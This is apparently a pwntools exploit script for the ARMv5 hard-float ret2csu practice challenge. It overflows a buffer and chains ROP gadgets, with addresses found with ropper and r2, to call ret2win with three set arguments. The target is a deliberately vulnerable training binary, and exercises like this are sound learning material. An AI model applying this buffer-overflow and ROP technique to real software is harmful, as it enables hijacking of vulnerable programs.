#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/arm-linux-gnueabihf"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2csu_armv5-hf')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./ret2csu-hf_armv5_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616a)

ARG_1 = p32(0xdeadbeef)
ARG_2 = p32(0xcafebabe)
ARG_3 = p32(0xd00df00d)

# (r2) iS - sections adresses
# (r2) pd @ 0x00010478 - .plt section
# ;-- ret2win:
# 0x000104a4      00c68fe2       add ip, pc, 0, 12
RET2WIN = p32(0x104a4)

# ropper --arch ARM --file ret2csu_armv5
# 0x00010480: pop {r3, pc};
# 0x00010544: bx r3;
# 0x00010620: pop {r1, r2, r4, r5, r6, r7, r8, r12, lr, pc};
POP_R3 = p32(0x10480)
BX_R3 = p32(0x10544)
POP_R124567812_LR_PC = p32(0x10620)

# ropper --arch ARMTHUMB --file ret2csu_armv5-hf
# 0x00010618 (0x00010619): mov r1, r8; mov r0, r7; blx r3;
# 0x00010622 (0x00010623): pop.w {r3, r4, r5, r6, r7, r8, r9, pc};
MOV_R1_R0 = p32(0x10619)
POPW_R3456789_PC = p32(0x10623)

payload  = padding + POP_R124567812_LR_PC
payload += p32(0xa5) + ARG_3 + 7*p32(0xa5) + POP_R3
payload += POPW_R3456789_PC + BX_R3
payload += RET2WIN + 3*p32(0xa5) + ARG_1 + ARG_2 + p32(0xa5) + MOV_R1_R0 

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
